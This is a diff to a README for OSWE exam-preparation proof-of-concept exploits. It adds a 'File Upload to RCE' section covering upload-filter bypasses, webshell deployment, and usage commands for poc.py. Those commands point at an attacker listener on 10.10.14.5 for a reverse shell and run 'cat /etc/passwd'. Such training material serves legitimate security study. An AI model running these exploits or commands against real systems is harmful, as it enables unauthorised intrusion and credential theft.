@@ -10,6 +10,7 @@ This directory contains complete, working PoC examples for OSWE exam preparation
 | [Bassmaster JS Injection](#bassmaster-nodejs-injection) | CVE-2014-7205 | NodeJS JavaScript Injection → RCE | ⭐⭐ |
 | [ManageEngine SQLi](#manageengine-sqli) | Various | PostgreSQL SQLi → File Write → RCE | ⭐⭐⭐ |
 | [Atmail XSS to RCE](#atmail-xss-to-rce) | CVE-2012-2593 | Stored XSS → CSRF → RCE | ⭐⭐⭐ |
+| [File Upload to RCE](#file-upload-to-rce) | N/A (common pattern) | Insecure Upload → Webshell → RCE | ⭐⭐⭐ |
 
 ## Directory Structure
 
@@ -202,6 +203,53 @@ python3 poc.py --target-ip 192.168.1.100 --listening-ip 10.10.14.5 --payload-por
 - Understanding admin workflows
 - CSRF exploitation
 - Social engineering aspects
+
+---
+
+### File Upload to RCE
+
+**Vulnerability**: Insecure file upload (weak extension / Content-Type / magic-byte / path handling) leading to webshell deployment and RCE.
+
+**Exploitation Path**:
+```
+Recon upload form + filters → Craft bypass (double-ext, magic bytes, content-type lie, etc.)
+→ Upload webshell (PHP/ASPX/JSP) → Locate file on disk (response or common dirs)
+→ Execute via direct request or LFI → RCE (whoami, reverse shell, further access)
+```
+
+**Key Concepts**:
+- Extension vs Content-Type vs magic byte validation bypasses
+- Double extensions, null bytes (legacy), case tricks, combined bypasses
+- Webshell construction for multiple languages
+- Predictable upload paths + response path disclosure
+- Chaining (upload after auth bypass / SQLi write / XSS CSRF)
+
+**Usage**:
+```bash
+cd file-upload-rce
+
+# Most common starting bypass for PHP targets
+python3 poc.py 192.168.1.10 80 --endpoint /upload.php \
+  --bypass double_ext --shell-type php --command whoami \
+  10.10.14.5 4444
+
+# Magic bytes (when they inspect content)
+python3 poc.py target 8080 --bypass magic_bytes --shell-type php \
+  --command "cat /etc/passwd" 10.10.14.5 9001
+
+# ASPX / IIS target
+python3 poc.py 10.10.10.50 80 --endpoint /admin/upload.aspx \
+  --bypass content_type --shell-type aspx 10.10.14.5 4444
+
+# With Burp for debugging
+python3 poc.py ... --proxy http://127.0.0.1:8080
+```
+
+**Learning Value**: ⭐⭐⭐⭐⭐
+- One of the most reliable and frequently chained RCE vectors in OSWE
+- Teaches filter bypass thinking that applies to many other validation flaws
+- Excellent for practicing stage-based PoCs and post-upload discovery
+- See also: `guides/File-Upload-to-RCE.md` (full methodology + diagrams + cheat sheets), `notes/FILE-UPLOAD-TO-RCE.md`, Roadmap Week 6, HTB Popcorn/Vault
 
 ## Common Usage Patterns
 
